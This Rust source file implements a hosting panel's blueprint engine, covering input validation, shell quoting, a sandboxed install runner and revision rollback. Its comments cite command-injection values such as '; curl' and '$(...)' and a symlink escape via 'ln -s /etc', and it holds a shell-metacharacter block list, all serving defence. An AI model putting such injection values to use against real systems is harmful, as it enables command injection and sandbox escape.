//! Blueprint engine: input resolution, launch plans, and sandboxed setup.
use crate::db::Db;
use crate::models::{self, Blueprint, BlueprintInput, InputKind, Server};
use anyhow::{anyhow, bail, Result};
use chrono::Utc;
use regex::Regex;
use rusqlite::{params, OptionalExtension, TransactionBehavior};
use http_body_util::BodyExt;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::sync::LazyLock;
use voltpanel::node_daemon::Utf8Carry;

/// Resolve blueprint inputs for a workspace, applying owner overrides.
pub fn resolve_variables(db: &Db, server: &Server) -> Result<Vec<(BlueprintInput, String)>> {
    let blueprint = models::get_blueprint(db, server.blueprint_id)?;
    let overrides: HashMap<String, String> = models::get_server_vars(db, server.id)?
        .into_iter()
        .collect();
    let mut out = Vec::new();
    for var in &blueprint.variables {
        let value = overrides
            .get(&var.env_var)
            .cloned()
            .unwrap_or_else(|| var.default_value.clone());
        out.push((var.clone(), value));
    }
    Ok(out)
}
/// Validate every resolved input — override or declared default — against its
/// declared kind before the value is interpolated into an install script,
/// launch command, or config template. A mis-declared default fails here
/// instead of launching a mangled command.
fn validate_resolved_variables(db: &Db, server: &Server) -> Result<()> {
    for (var, value) in resolve_variables(db, server)? {
        validate_value(&var, &value)?;
        // A Path input resolves against the workspace dir at launch; the
        // syntactic checks above cannot see through a symlink the install
        // step may have planted, so require the canonicalized join to stay
        // inside the workspace whenever the workspace exists.
        if matches!(&var.kind, InputKind::Path { .. }) && !value.trim().is_empty() {
            enforce_workspace_path(
                &var.env_var,
                &crate::services::proc::server_dir(server),
                value.trim(),
            )?;
        }
    }
    Ok(())
}

/// Placeholder syntax: `${input.NAME}` for blueprint inputs and
/// `${workspace.field}` for workspace metadata. Unknown keys are an error so a
/// typo surfaces at resolve time instead of launching a mangled command.
static PLACEHOLDER: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\$\{\s*([a-z]+)\.([A-Za-z0-9_]+)\s*\}").unwrap());

/// Namespaced values available to launch plans and config templates, plus the
/// input keys that are declared but deliberately excluded from rendering.
struct TemplateCtx {
    /// Values available for `${ns.key}` substitution.
    values: HashMap<String, String>,
    /// Declared but non-viewable input keys → the env_var they hide. Present
    /// so a reference produces a precise "secret is env-only" error instead of
    /// a misleading "unknown placeholder".
    secrets: HashMap<String, String>,
}

/// Build the template context. Non-viewable inputs are secret-delivery
/// channel only: they go to the process env (env_for_server) but never render
/// into launch commands, install scripts, or config templates, where the
/// console would echo them.
fn template_context(db: &Db, server: &Server) -> Result<TemplateCtx> {
    let mut values = HashMap::new();
    let mut secrets = HashMap::new();
    for (v, val) in resolve_variables(db, server)? {
        let key = format!("input.{}", v.env_var);
        if v.user_viewable {
            values.insert(key, val);
        } else {
            secrets.insert(key, v.env_var);
        }
    }
    values.insert("workspace.name".into(), server.name.clone());
    values.insert("workspace.uuid".into(), server.uuid.clone());
    values.insert(
        "workspace.memory_mb".into(),
        server.memory_mb.to_string(),
    );
    values.insert(
        "workspace.disk_mb".into(),
        server.disk_mb.to_string(),
    );
    values.insert(
        "workspace.cpu_percent".into(),
        server.cpu_percent.to_string(),
    );
    values.insert(
        "workspace.port".into(),
        server.port.map(|p| p.to_string()).unwrap_or_default(),
    );
    values.insert(
        "workspace.dir".into(),
        crate::services::proc::server_dir(server)
            .to_string_lossy()
            .to_string(),
    );
    Ok(TemplateCtx { values, secrets })
}

/// Substitute every `${ns.key}` placeholder from `ctx`. Values stay raw:
/// this is the context for config templates, where quoting would corrupt the
/// output (JSON, key=value, ...).
fn render(template: &str, ctx: &TemplateCtx) -> Result<String> {
    render_impl(template, ctx, false)
}

/// Render a template that will be executed as a shell command (`sh -c`).
/// User-supplied values (`input.*`, `workspace.name`) are shell-quoted so a
/// value can never smuggle metacharacters into the command line; panel-owned
/// numeric fields, `workspace.dir` and `workspace.uuid` are trusted and stay
/// bare.
fn render_command(template: &str, ctx: &TemplateCtx) -> Result<String> {
    render_impl(template, ctx, true)
}

fn render_impl(template: &str, ctx: &TemplateCtx, quote: bool) -> Result<String> {
    let mut missing: Option<String> = None;
    let mut secret: Option<String> = None;
    let out = PLACEHOLDER.replace_all(template, |caps: &regex::Captures| {
        let key = format!("{}.{}", &caps[1], &caps[2]);
        match ctx.values.get(&key) {
            Some(v) if quote && is_command_value(&key) => shell_quote(v),
            Some(v) => v.clone(),
            None => {
                if let Some(env_var) = ctx.secrets.get(&key) {
                    secret.get_or_insert_with(|| format!("input.{env_var}"));
                } else {
                    missing.get_or_insert(key);
                }
                String::new()
            }
        }
    });
    if let Some(key) = secret {
        bail!(
            "secret variable {key} cannot be rendered into a command or config; it is passed to the process env only"
        );
    }
    if let Some(key) = missing {
        bail!("unknown placeholder ${{{key}}}");
    }
    Ok(out.into_owned())
}

/// Keys whose values flow into a shell command line and therefore get quoted:
/// user-supplied inputs and the user-chosen workspace name.
fn is_command_value(key: &str) -> bool {
    key.starts_with("input.") || key == "workspace.name"
}

/// Single-quote a value for shell interpolation: `'` becomes `'\''` and the
/// whole value is wrapped, so the value is exactly one shell word. Values made
/// only of safe characters stay bare so templates like
/// `java -Xmx${input.MEMORY}M` keep their shape.
fn shell_quote(value: &str) -> String {
    let safe = |c: char| {
        c.is_ascii_alphanumeric()
            || matches!(c, '-' | '_' | '.' | ',' | ':' | '/' | '@' | '=' | '+' | '%')
    };
    if value.is_empty() {
        return "''".to_string();
    }
    if value.chars().all(safe) {
        return value.to_string();
    }
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for c in value.chars() {
        if c == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

/// Build the final launch command by interpolating blueprint and workspace placeholders.
pub fn resolve_startup(db: &Db, server: &Server) -> Result<String> {
    // Inputs are validated before render so an invalid value fails at launch
    // instead of booting a mangled command.
    validate_resolved_variables(db, server)?;
    let blueprint = models::get_blueprint(db, server.blueprint_id)?;
    let template = if server.startup.is_empty() {
        blueprint.startup.clone()
    } else {
        server.startup.clone()
    };
    render_command(&template, &template_context(db, server)?)
}

/// Environment passed to the process from blueprint inputs and workspace metadata.
pub fn env_for_server(db: &Db, server: &Server) -> Vec<(String, String)> {
    let mut env: Vec<(String, String)> = Vec::new();
    if let Ok(vars) = resolve_variables(db, server) {
        for (v, val) in vars {
            if v.user_viewable || !val.is_empty() {
                env.push((v.env_var.clone(), val));
            }
        }
    }
    env.push((
        "HOME".into(),
        crate::services::proc::server_dir(server)
            .to_string_lossy()
            .to_string(),
    ));
    env.push((
        "PWD".into(),
        crate::services::proc::server_dir(server)
            .to_string_lossy()
            .to_string(),
    ));
    env.push(("SERVER_UUID".into(), server.uuid.clone()));
    env.push(("SERVER_NAME".into(), server.name.clone()));
    env.push(("SERVER_MEMORY".into(), server.memory_mb.to_string()));
    env.push(("SERVER_DISK".into(), server.disk_mb.to_string()));
    env.push(("SERVER_CPU".into(), server.cpu_percent.to_string()));
    env.push((
        "SERVER_PORT".into(),
        server.port.map(|p| p.to_string()).unwrap_or_default(),
    ));
    env
}

/// Validate an input value against its declared type. Errors name the input so
/// the API surfaces something an operator can act on.
pub fn validate_value(var: &BlueprintInput, value: &str) -> Result<()> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        if var.required {
            bail!("{} is required", var.env_var);
        }
        return Ok(());
    }
    match &var.kind {
        InputKind::Text { max_len, pattern } => {
            if let Some(mx) = max_len {
                if value.chars().count() > *mx {
                    bail!("{} must be at most {} characters", var.env_var, mx);
                }
            }
            if let Some(p) = pattern {
                let re = Regex::new(p).map_err(|e| anyhow!("blueprint pattern invalid: {e}"))?;
                if !re.is_match(value) {
                    bail!("{} does not match required pattern", var.env_var);
                }
            }
        }
        InputKind::Number { min, max } => {
            let v: f64 = trimmed
                .parse()
                .map_err(|_| anyhow!("{} must be a number", var.env_var))?;
            // NaN compares false against every bound and `1e999`/`inf` slip
            // past a missing bound, so require a finite value outright.
            if !v.is_finite() {
                bail!("{} must be a finite number", var.env_var);
            }
            if let Some(mn) = min {
                if v < *mn {
                    bail!("{} must be at least {}", var.env_var, fmt_num(*mn));
                }
            }
            if let Some(mx) = max {
                if v > *mx {
                    bail!("{} must be at most {}", var.env_var, fmt_num(*mx));
                }
            }
        }
        InputKind::Bool => {
            if !matches!(
                trimmed.to_ascii_lowercase().as_str(),
                "true" | "false" | "1" | "0" | "yes" | "no" | "on" | "off"
            ) {
                bail!("{} must be a boolean", var.env_var);
            }
        }
        InputKind::Choice { options } => {
            if !options.iter().any(|o| o == trimmed) {
                bail!("{} must be one of: {}", var.env_var, options.join(", "));
            }
        }
        InputKind::Path { max_len } => {
            if let Some(mx) = max_len {
                if value.chars().count() > *mx {
                    bail!("{} must be at most {} characters", var.env_var, mx);
                }
            }
            validate_workspace_path(&var.env_var, trimmed)?;
        }
        InputKind::Url => {
            let parsed = url::Url::parse(trimmed)
                .map_err(|_| anyhow!("{} must be an http(s) URL", var.env_var))?;
            if !matches!(parsed.scheme(), "http" | "https") {
                bail!("{} must be an http(s) URL", var.env_var);
            }
            let host = parsed.host_str().filter(|h| !h.is_empty());
            if host.is_none() {
                bail!("{} must include a host", var.env_var);
            }
            // Shell metacharacters are refused outright: a URL interpolated
            // into a command must never be able to break out (`; curl`,
            // `$(...)`, backticks, ...). `?`, `&` and `=` stay legal for
            // query strings; the WHATWG parser alone accepts `;`, `$` and
            // parens in paths, so parse-success is not enough.
            let injectable = |c: char| {
                matches!(
                    c,
                    ';' | '|'
                        | '$'
                        | '`'
                        | '('
                        | ')'
                        | '<'
                        | '>'
                        | '*'
                        | '~'
                        | '"'
                        | '\''
                        | '{'
                        | '}'
                        | '['
                        | ']'
                        | '!'
                        | '^'
                        | '\\'
                ) || c.is_whitespace()
                    || c.is_control()
            };
            if trimmed.contains(injectable) {
                bail!("{} contains shell metacharacters", var.env_var);
            }
            // The authority charset is pinned as well: only hostname-safe
            // characters (plus `:`, brackets and `%` for IPv6/ports).
            if !host.unwrap().chars().all(|c| {
                c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '[' | ']' | '%')
            }) {
                bail!("{} contains invalid characters", var.env_var);
            }
        }
    }
    Ok(())
}

fn fmt_num(n: f64) -> String {
    if n.fract() == 0.0 {
        format!("{}", n as i64)
    } else {
        format!("{n}")
    }
}

/// A path input is interpolated into a launch plan that runs with the workspace
/// as cwd, so anything that can leave the workspace is refused here.
fn validate_workspace_path(env_var: &str, value: &str) -> Result<()> {
    if value.starts_with('/') {
        bail!("{env_var} must be a workspace-relative path");
    }
    if value.starts_with('~') {
        bail!("{env_var} must not reference a home directory");
    }
    if value.contains('\0') {
        bail!("{env_var} contains an invalid character");
    }
    for part in value.split('/') {
        if part == ".." {
            bail!("{env_var} must not traverse outside the workspace");
        }
    }
    Ok(())
}

/// Resolve `dir.join(relative)` through symlinks and require the result to
/// stay inside `dir`. `validate_workspace_path` blocks `..` lexically but
/// cannot see through a symlink: an install script that runs `ln -s /etc
/// link` makes a later `link/x` Path input escape the workspace when the
/// launch command resolves it. The deepest existing ancestor is canonicalized
/// and the missing tail re-appended, so a not-yet-created file under a
/// symlinked directory is caught too. A workspace that does not exist yet has
/// nothing to escape through and is skipped.
fn enforce_workspace_path(env_var: &str, dir: &std::path::Path, relative: &str) -> Result<()> {
    let Ok(root) = std::fs::canonicalize(dir) else {
        return Ok(());
    };
    let joined = dir.join(relative);
    let mut tail: Vec<&std::ffi::OsStr> = Vec::new();
    let mut probe = joined.as_path();
    let canonical = loop {
        match std::fs::canonicalize(probe) {
            Ok(c) => break c,
            Err(_) => {
                let Some(name) = probe.file_name() else {
                    return Ok(());
                };
                tail.push(name);
                let Some(parent) = probe.parent() else {
                    return Ok(());
                };
                probe = parent;
            }
        }
    };
    let resolved = tail
        .iter()
        .rev()
        .fold(canonical, |acc, part| acc.join(part));
    if !resolved.starts_with(&root) {
        bail!("{env_var} must resolve inside the workspace (symlink escape)");
    }
    Ok(())
}

/// Validate a blueprint's input declarations at save/import time so a
/// malformed blueprint fails with a 400 instead of surfacing as a 500 at
/// launch. Each declared default is checked against its kind exactly like the
/// launch path does, patterns are compiled once here, and env_var names must
/// be non-empty and unique so overrides cannot alias each other.
pub fn validate_inputs(vars: &[BlueprintInput]) -> Result<()> {
    let mut seen = std::collections::HashSet::new();
    for (i, var) in vars.iter().enumerate() {
        if var.env_var.trim().is_empty() {
            bail!("variable #{}: env_var must not be empty", i + 1);
        }
        if !seen.insert(var.env_var.as_str()) {
            bail!(
                "variable #{}: env_var '{}' is declared more than once",
                i + 1,
                var.env_var
            );
        }
        if let InputKind::Text {
            pattern: Some(p), ..
        } = &var.kind
        {
            Regex::new(p)
                .map_err(|e| anyhow!("variable '{}': invalid pattern: {e}", var.env_var))?;
        }
        if let InputKind::Choice { options } = &var.kind {
            if options.is_empty() {
                bail!(
                    "variable '{}': choice must declare at least one option",
                    var.env_var
                );
            }
        }
        validate_value(var, &var.default_value).map_err(|e| {
            anyhow!("variable '{}': default_value is invalid: {e}", var.env_var)
        })?;
    }
    Ok(())
}

/// Cap on blueprint import documents; a giant JSON body must not OOM the
/// parser at the import boundary.
pub const MAX_BLUEPRINT_IMPORT_BYTES: usize = 1024 * 1024;

/// Parse a VoltPanel blueprint JSON document. Untrusted imports are validated
/// here, not just decoded: the payload is size-capped, the startup command
/// must be non-empty, and every declared input (and its default) passes the
/// same checks the save path applies.
pub fn parse_blueprint_json(json: &str) -> Result<BlueprintImport> {
    if json.len() > MAX_BLUEPRINT_IMPORT_BYTES {
        bail!(
            "blueprint import exceeds {} byte limit",
            MAX_BLUEPRINT_IMPORT_BYTES
        );
    }
    let parsed: BlueprintImport =
        serde_json::from_str(json).map_err(|e| anyhow!("invalid blueprint json: {e}"))?;
    if parsed.startup.trim().is_empty() {
        bail!("blueprint import must declare a non-empty startup command");
    }
    validate_inputs(&parsed.variables)?;
    Ok(parsed)
}

#[derive(Debug, serde::Deserialize)]
pub struct BlueprintImport {
    pub name: String,
    #[serde(default)]
    pub description: String,
    #[serde(default)]
    pub author: String,
    #[serde(default)]
    pub category: String,
    #[serde(default = "default_runtime")]
    pub runtime_hint: String,
    #[serde(default)]
    pub startup: String,
    #[serde(default)]
    pub config: Option<serde_json::Value>,
    #[serde(default)]
    pub install: Option<InstallScript>,
    #[serde(default)]
    pub variables: Vec<BlueprintInput>,
    #[serde(default = "default_stop")]
    pub stop: String,
}

fn default_runtime() -> String {
    "native".into()
}
fn default_stop() -> String {
    "stop".into()
}

#[derive(Debug, serde::Deserialize)]
pub struct InstallScript {
    #[serde(default)]
    pub script: String,
}
/// Wall-clock bound for a sandboxed install script. A hung setup (e.g.
/// `while :; do :; done`) is killed after this instead of leaking the
/// spawn_blocking thread forever.
const INSTALL_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(10 * 60);

/// SIGKILL the sandboxed child and its process group. The child is a session
/// leader (bwrap `--new-session`), so the negative pid reaches the whole
/// group; the cgroup sweep catches anything that escaped it.
fn kill_install_tree(pid: u32) {
    unsafe { libc::kill(-(pid as i32), libc::SIGKILL) };
    unsafe { libc::kill(pid as i32, libc::SIGKILL) };
}

/// `child.wait()` with a wall-clock deadline: when the install overruns, kill
/// the tree and sweep the cgroup. Returns (status, timed_out).
fn wait_install(
    child: &mut std::process::Child,
    pid: u32,
    cgroup: &crate::isolation::Cgroup,
) -> Result<(std::process::ExitStatus, bool)> {
    let deadline = std::time::Instant::now() + INSTALL_TIMEOUT;
    loop {
        if let Some(status) = child.try_wait()? {
            return Ok((status, false));
        }
        if std::time::Instant::now() >= deadline {
            kill_install_tree(pid);
            let _ = cgroup.kill_all();
            return Ok((child.wait()?, true));
        }
        std::thread::sleep(std::time::Duration::from_millis(200));
    }
}


/// Run blueprint setup inside an isolated workspace. Blocks until done.
pub fn run_install(
    db: &Db,
    server: &Server,
    blueprint: &Blueprint,
    notifier: &crate::services::proc::Notifier,
    hub: &crate::services::console::ConsoleHub,
) -> Result<()> {
    let Some(script) = &blueprint.install_script else {
        return Ok(());
    };
    if script.trim().is_empty() {
        return Ok(());
    }
    validate_resolved_variables(db, server)?;
    let script = render_command(script, &template_context(db, server)?)?;
    let dir = crate::services::proc::server_dir(server);
    std::fs::create_dir_all(&dir)?;
    crate::isolation::prepare_root(&dir, &server.uuid)?;
    crate::isolation::own_tree(&dir, &server.uuid)?;
    let env = env_for_server(db, server);
    let isolation = crate::isolation::IsolationConfig::default();
    let limits = crate::isolation::Limits {
        memory_bytes: server.memory_mb.max(256) as u64 * 1_048_576,
        cpu_percent: server.cpu_percent.max(25) as u64,
        pids_max: 256,
    };
    let cgroup =
        crate::isolation::Cgroup::create(&isolation, &format!("{}-install", server.uuid), &limits)?;
    let mut cmd = crate::isolation::sandbox_command(
        &isolation,
        &dir,
        &format!("{}-install", server.uuid),
        &script,
        &limits,
    )?;
    cmd.stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    for (k, v) in &env {
        cmd.env(k, v);
    }
    let mut child = cmd
        .spawn()
        .map_err(|e| anyhow!("sandboxed install failed to start: {e}"))?;
    let pid = child.id();
    cgroup.attach(pid)?;
    let network =
        crate::isolation::NetworkLease::configure(pid, &format!("{}-install", server.uuid), &[])?;

    // Stream install output into the console hub tagged `Install`, so setup is
    // live and replayable exactly like runtime output.
    fn pump_install(
        mut stream: impl std::io::Read,
        hub: &crate::services::console::ConsoleHub,
        sid: i64,
        tail: &parking_lot::Mutex<String>,
    ) {
        let mut buf = vec![0u8; 4096];
        let mut carry = Utf8Carry::default();
        loop {
            match stream.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    let text = carry.push(&buf[..n]);
                    hub.append(sid, &text, crate::services::console::LineKind::Install);
                    let mut t = tail.lock();
                    t.push_str(&text);
                    if t.len() > 400 {
                        let keep = t.len() - 400;
                        t.drain(..keep);
                    }
                }
            }
        }
    }

    let tail: std::sync::Arc<parking_lot::Mutex<String>> = std::sync::Arc::default();
    let (status, timed_out) = match (child.stdout.take(), child.stderr.take()) {
        (Some(out), Some(err)) => {
            let (hub_out, hub_err) = (hub.clone(), hub.clone());
            let (tail_out, tail_err) = (tail.clone(), tail.clone());
            let sid = server.id;
            let jo = std::thread::spawn(move || pump_install(out, &hub_out, sid, &tail_out));
            let je = std::thread::spawn(move || pump_install(err, &hub_err, sid, &tail_err));
            let result = wait_install(&mut child, pid, &cgroup)?;
            let _ = jo.join();
            let _ = je.join();
            result
        }
        _ => wait_install(&mut child, pid, &cgroup)?,
    };
    drop(network);
    if timed_out {
        notifier.notify(
            "error",
            &format!("Install timed out for '{}'", server.name),
            &format!(
                "install script exceeded the {} second limit",
                INSTALL_TIMEOUT.as_secs()
            ),
            Some(server.id),
        );
        bail!(
            "install script timed out after {} seconds",
            INSTALL_TIMEOUT.as_secs()
        );
    }
    if !status.success() {
        let msg = tail.lock().clone();
        let msg = msg.lines().last().unwrap_or("unknown error").to_string();
        notifier.notify(
            "error",
            &format!("Install failed for '{}'", server.name),
            &msg,
            Some(server.id),
        );
        bail!("install script failed: {msg}");
    }
    notifier.notify(
        "success",
        &format!("'{}' installed", server.name),
        "Install script completed",
        Some(server.id),
    );
    Ok(())
}

/// Build the default workspace configuration declared by a blueprint. Inputs
/// are validated first, mirroring `run_install`, so a bad value never renders
/// into a config file.
pub fn build_default_config(db: &Db, server: &Server) -> Result<Option<serde_json::Value>> {
    let blueprint = models::get_blueprint(db, server.blueprint_id)?;
    let Some(cfg) = &blueprint.default_config else {
        return Ok(None);
    };
    // Mirror run_install: validate only when there is something to render.
    validate_resolved_variables(db, server)?;
    let text = render(cfg, &template_context(db, server)?)?;
    serde_json::from_str(&text)
        .map_err(|e| {
            anyhow!(
                "blueprint '{}' declares invalid default_config json: {e}",
                blueprint.name
            )
        })
        .map(Some)
}

// ---------------- Versioning & drift ----------------

/// Snapshot JSON of a blueprint's mutable content. The field set is stable so
/// revisions stay comparable across time; rollback restores this exact shape.
fn content_doc(b: &Blueprint) -> serde_json::Value {
    serde_json::json!({
        "name": b.name,
        "description": b.description,
        "author": b.author,
        "category": b.category,
        "runtime_hint": b.runtime_hint,
        "startup": b.startup,
        "stop_command": b.stop_command,
        "default_config": b.default_config,
        "install_script": b.install_script,
        "variables": b.variables,
    })
}

/// Deterministic SHA-256 of a blueprint's content: name, description, author,
/// category, runtime_hint, startup, stop, default_config, install_script,
/// variables.
/// id/version/uuid/timestamps are metadata and never hashed; variables are
/// serialized in declaration order, so equal content always yields the same
/// digest.
pub fn digest_of(b: &Blueprint) -> String {
    let doc = serde_json::json!({
        "name": b.name,
        "description": b.description,
        "author": b.author,
        "category": b.category,
        "runtime_hint": b.runtime_hint,
        "startup": b.startup,
        "stop_command": b.stop_command,
        "default_config": b.default_config,
        "install_script": b.install_script,
        "variables": b.variables,
    });
    hex::encode(Sha256::digest(doc.to_string().as_bytes()))
}

/// Load a blueprint by id from any connection (plain or transactional).
fn blueprint_row(conn: &rusqlite::Connection, id: i64) -> Result<Option<Blueprint>> {
    let row = conn
        .query_row(
            "SELECT id,uuid,name,description,author,category,runtime_hint,startup,default_config,install_script,variables,stop_command,created_at,updated_at FROM blueprints WHERE id=?1",
            [id],
            |r| {
                Ok(Blueprint {
                    id: r.get(0)?,
                    uuid: r.get(1)?,
                    name: r.get(2)?,
                    description: r.get(3)?,
                    author: r.get(4)?,
                    category: r.get(5)?,
                    runtime_hint: r.get(6)?,
                    startup: r.get(7)?,
                    default_config: r.get(8)?,
                    install_script: r.get(9)?,
                    variables: {
                        let raw: String = r.get(10)?;
                        serde_json::from_str(&raw).map_err(|e| {
                            rusqlite::Error::FromSqlConversionFailure(
                                10,
                                rusqlite::types::Type::Text,
                                Box::new(e),
                            )
                        })?
                    },
                    stop_command: r.get(11)?,
                    created_at: r.get(12)?,
                    updated_at: r.get(13)?,
                })
            },
        )
        .optional()?;
    Ok(row)
}

/// Capture the blueprint's current state as a new revision at the next version,
/// bumping `blueprints.version`, all in one transaction so history and counter
/// never diverge. Returns the new version.
pub fn snapshot(db: &Db, blueprint_id: i64, author: &str, note: &str) -> Result<i64> {
    let mut conn = db.get()?;
    let tx = conn.transaction_with_behavior(TransactionBehavior::Immediate)?;
    let bp = blueprint_row(&tx, blueprint_id)?.ok_or_else(|| anyhow!("blueprint not found"))?;
    let version: i64 = tx.query_row(
        "SELECT version FROM blueprints WHERE id=?1",
        [blueprint_id],
        |r| r.get(0),
    )?;
    let next = version + 1;
    tx.execute(
        "INSERT INTO blueprint_revisions (blueprint_id, version, snapshot, digest, author, note, created_at) VALUES (?1,?2,?3,?4,?5,?6,?7)",
        params![
            blueprint_id,
            next,
            content_doc(&bp).to_string(),
            digest_of(&bp),
            author,
            note,
            Utc::now().to_rfc3339()
        ],
    )?;
    tx.execute(
        "UPDATE blueprints SET version=?1 WHERE id=?2",
        params![next, blueprint_id],
    )?;
    tx.commit()?;
    Ok(next)
}

/// True when two blueprints carry identical mutable content. The API uses this
/// to skip no-op PATCHes entirely: no revision is written, no version bump.
pub fn content_equals(a: &Blueprint, b: &Blueprint) -> bool {
    content_doc(a) == content_doc(b)
}

/// Snapshot the current state and apply a full update in one transaction, so
/// the revision always records the exact pre-update content and the version
/// counter can never diverge from stored history. Returns the new version.
pub fn snapshot_and_update(
    db: &Db,
    blueprint_id: i64,
    updated: &Blueprint,
    author: &str,
    note: &str,
) -> Result<i64> {
    let mut conn = db.get()?;
    let tx = conn.transaction_with_behavior(TransactionBehavior::Immediate)?;
    let cur = blueprint_row(&tx, blueprint_id)?.ok_or_else(|| anyhow!("blueprint not found"))?;
    let version: i64 = tx.query_row(
        "SELECT version FROM blueprints WHERE id=?1",
        [blueprint_id],
        |r| r.get(0),
    )?;
    let next = version + 1;
    tx.execute(
        "INSERT INTO blueprint_revisions (blueprint_id, version, snapshot, digest, author, note, created_at) VALUES (?1,?2,?3,?4,?5,?6,?7)",
        params![
            blueprint_id,
            next,
            content_doc(&cur).to_string(),
            digest_of(&cur),
            author,
            note,
            Utc::now().to_rfc3339()
        ],
    )?;
    tx.execute(
        "UPDATE blueprints SET name=?1, description=?2, author=?3, category=?4, runtime_hint=?5, startup=?6, default_config=?7, install_script=?8, variables=?9, stop_command=?10, version=?11, updated_at=?12 WHERE id=?13",
        params![
            updated.name,
            updated.description,
            updated.author,
            updated.category,
            updated.runtime_hint,
            updated.startup,
            updated.default_config,
            updated.install_script,
            serde_json::to_string(&updated.variables)?,
            updated.stop_command,
            next,
            Utc::now().to_rfc3339(),
            blueprint_id
        ],
    )?;
    tx.commit()?;
    Ok(next)
}

#[derive(Debug, Clone, Serialize)]
pub struct RevisionMeta {
    pub id: i64,
    pub version: i64,
    pub digest: String,
    pub author: String,
    pub note: String,
    pub created_at: String,
}

/// Revision list, newest first.
pub fn list_revisions(db: &Db, blueprint_id: i64) -> Result<Vec<RevisionMeta>> {
    let conn = db.get()?;
    let mut stmt = conn.prepare(
        "SELECT id, version, digest, author, note, created_at FROM blueprint_revisions WHERE blueprint_id=?1 ORDER BY version DESC",
    )?;
    let rows = stmt.query_map([blueprint_id], |r| {
        Ok(RevisionMeta {
            id: r.get(0)?,
            version: r.get(1)?,
            digest: r.get(2)?,
            author: r.get(3)?,
            note: r.get(4)?,
            created_at: r.get(5)?,
        })
    })?;
    rows.collect::<std::result::Result<Vec<_>, _>>()
        .map_err(Into::into)
}

/// Full snapshot JSON stored for a revision.
pub fn revision_snapshot(db: &Db, blueprint_id: i64, version: i64) -> Result<serde_json::Value> {
    let conn = db.get()?;
    let snap: String = conn
        .query_row(
            "SELECT snapshot FROM blueprint_revisions WHERE blueprint_id=?1 AND version=?2",
            params![blueprint_id, version],
            |r| r.get(0),
        )
        .optional()?
        .ok_or_else(|| anyhow!("revision {version} does not exist"))?;
    Ok(serde_json::from_str(&snap)?)
}

/// Restore a blueprint to a past revision. Current state is snapshotted first so
/// the rollback is itself undoable; version is bumped on restore. Returns the
/// new current version.
pub fn rollback(db: &Db, blueprint_id: i64, version: i64, author: &str) -> Result<i64> {
    rollback_inner(
        db,
        blueprint_id,
        version,
        author,
        &format!("rollback to v{version}"),
    )
}

/// `rollback` with an explicit note recorded on the undo snapshot.
pub fn rollback_with_note(
    db: &Db,
    blueprint_id: i64,
    version: i64,
    author: &str,
    note: &str,
) -> Result<i64> {
    rollback_inner(db, blueprint_id, version, author, note)
}

/// Extract a required string field from a revision snapshot, erroring instead
/// of silently restoring a missing or mistyped field as an empty value.
fn snapshot_str(snap: &serde_json::Value, key: &str) -> Result<String> {
    match snap.get(key) {
        Some(serde_json::Value::String(s)) => Ok(s.clone()),
        _ => bail!("revision snapshot field '{key}' is missing or corrupt"),
    }
}

/// Extract an optional string field: JSON `null` means "not set" and any other
/// shape is corrupt.
fn snapshot_opt_str(snap: &serde_json::Value, key: &str) -> Result<Option<String>> {
    match snap.get(key) {
        None => bail!("revision snapshot field '{key}' is missing"),
        Some(serde_json::Value::Null) => Ok(None),
        Some(serde_json::Value::String(s)) => Ok(Some(s.clone())),
        Some(_) => bail!("revision snapshot field '{key}' is corrupt"),
    }
}

fn rollback_inner(
    db: &Db,
    blueprint_id: i64,
    version: i64,
    author: &str,
    note: &str,
) -> Result<i64> {
    let mut conn = db.get()?;
    let tx = conn.transaction_with_behavior(TransactionBehavior::Immediate)?;
    let cur = blueprint_row(&tx, blueprint_id)?.ok_or_else(|| anyhow!("blueprint not found"))?;
    let cur_version: i64 = tx.query_row(
        "SELECT version FROM blueprints WHERE id=?1",
        [blueprint_id],
        |r| r.get(0),
    )?;
    let snap_json: String = tx
        .query_row(
            "SELECT snapshot FROM blueprint_revisions WHERE blueprint_id=?1 AND version=?2",
            params![blueprint_id, version],
            |r| r.get(0),
        )
        .optional()?
        .ok_or_else(|| anyhow!("revision {version} does not exist"))?;
    let snap: serde_json::Value = serde_json::from_str(&snap_json)?;
    // Restore content fields; id/uuid/created_at keep their current values.
    let mut restored = cur.clone();
    restored.name = snapshot_str(&snap, "name")?;
    restored.description = snapshot_str(&snap, "description")?;
    restored.author = snapshot_str(&snap, "author")?;
    restored.category = snapshot_str(&snap, "category")?;
    restored.runtime_hint = snapshot_str(&snap, "runtime_hint")?;
    restored.startup = snapshot_str(&snap, "startup")?;
    restored.stop_command = snapshot_str(&snap, "stop_command")?;
    restored.default_config = snapshot_opt_str(&snap, "default_config")?;
    restored.install_script = snapshot_opt_str(&snap, "install_script")?;
    restored.variables = snap
        .get("variables")
        .ok_or_else(|| anyhow!("revision snapshot field 'variables' is missing"))
        .and_then(|v| {
            serde_json::from_value(v.clone())
                .map_err(|e| anyhow!("revision snapshot field 'variables' is corrupt: {e}"))
        })?;
    let next = cur_version + 1;
    // Undo snapshot of the pre-rollback state.
    tx.execute(
        "INSERT INTO blueprint_revisions (blueprint_id, version, snapshot, digest, author, note, created_at) VALUES (?1,?2,?3,?4,?5,?6,?7)",
        params![
            blueprint_id,
            next,
            content_doc(&cur).to_string(),
            digest_of(&cur),
            author,
            note,
            Utc::now().to_rfc3339()
        ],
    )?;
    tx.execute(
        "UPDATE blueprints SET name=?1, description=?2, author=?3, category=?4, runtime_hint=?5, startup=?6, default_config=?7, install_script=?8, variables=?9, stop_command=?10, updated_at=?11, version=?12 WHERE id=?13",
        params![
            restored.name,
            restored.description,
            restored.author,
            restored.category,
            restored.runtime_hint,
            restored.startup,
            restored.default_config,
            restored.install_script,
            serde_json::to_string(&restored.variables)?,
            restored.stop_command,
            Utc::now().to_rfc3339(),
            next,
            blueprint_id
        ],
    )?;
    tx.commit()?;
    Ok(next)
}

/// Per-server view of blueprint drift.
#[derive(Debug, Clone, Serialize)]
pub struct Drift {
    pub server_id: i64,
    pub server_name: String,
    pub pinned_version: i64,
    pub current_version: i64,
